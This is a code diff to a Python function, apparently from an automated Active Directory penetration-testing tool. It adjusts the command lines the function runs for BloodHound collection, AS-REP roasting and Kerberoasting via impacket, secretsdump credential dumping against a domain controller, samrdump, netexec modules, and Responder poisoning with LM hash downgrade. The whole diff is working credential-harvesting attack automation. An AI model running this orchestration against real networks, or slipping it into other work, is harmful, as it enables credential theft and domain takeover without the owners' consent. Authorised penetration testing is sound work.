@@ -328,11 +328,12 @@ def ad_recon_task(self, session_id):
             "--zip",
             "-d",
             domain,
-            "--dc",
+            "-ns",
             dc_ip,
+            "--dns-tcp",
         ]
         if is_auth:
-            bh_args += ["-u", username, "-p", password]
+            bh_args += ["-u", "%s@%s" % (username, domain), "-p", password]
             if nt_hash:
                 bh_args += ["--hashes", ":%s" % nt_hash]
         rc, out, err = _run_tool(
@@ -349,7 +350,7 @@ def ad_recon_task(self, session_id):
 
         if is_auth:
             getnp_args = [
-                "impacket-GetNPUsers",
+                "GetNPUsers.py",
                 "%s/%s:%s" % (domain, username, password),
                 "-request",
                 "-dc-ip",
@@ -387,7 +388,7 @@ def ad_recon_task(self, session_id):
 
         if is_auth:
             getspn_args = [
-                "impacket-GetUserSPNs",
+                "GetUserSPNs.py",
                 "%s/%s:%s" % (domain, username, password),
                 "-request",
                 "-dc-ip",
@@ -403,7 +404,7 @@ def ad_recon_task(self, session_id):
             _record_tool(ts, "impacket_getspns", rc, err)
 
             sd_args = [
-                "impacket-secretsdump",
+                "secretsdump.py",
                 "%s/%s:%s@%s" % (domain, username, password, dc_ip),
                 "-outputfile",
                 "%s/secrets" % tmpdir,
@@ -416,7 +417,7 @@ def ad_recon_task(self, session_id):
             _record_tool(ts, "impacket_secretsdump", rc, err)
 
             samr_args = [
-                "impacket-samrdump",
+                "samrdump.py",
                 "%s/%s:%s@%s" % (domain, username, password, dc_ip),
             ]
             rc, out, err = _run_tool(
@@ -463,7 +464,7 @@ def ad_recon_task(self, session_id):
         )
         _record_tool(ts, "nxc_passpol", rc, err)
 
-        ioxid_cmd = ["nxc", "smb", dc_ip, "-M", "ioxid-resolver"]
+        ioxid_cmd = ["nxc", "smb", dc_ip, "-M", "ioxidresolver"]
         if is_auth:
             ioxid_cmd += ["-u", username, "-p", password]
         rc, out, err = _run_tool(
@@ -528,11 +529,12 @@ def ad_recon_task(self, session_id):
             iface = "eth0"
 
         responder_args = [
-            "responder",
+            "python3",
+            "/opt/Responder/Responder.py",
             "-I",
             iface,
             "-A",
-            "-wrf",
+            "-v",
             "--lm",
             "--disable-ess",
         ]
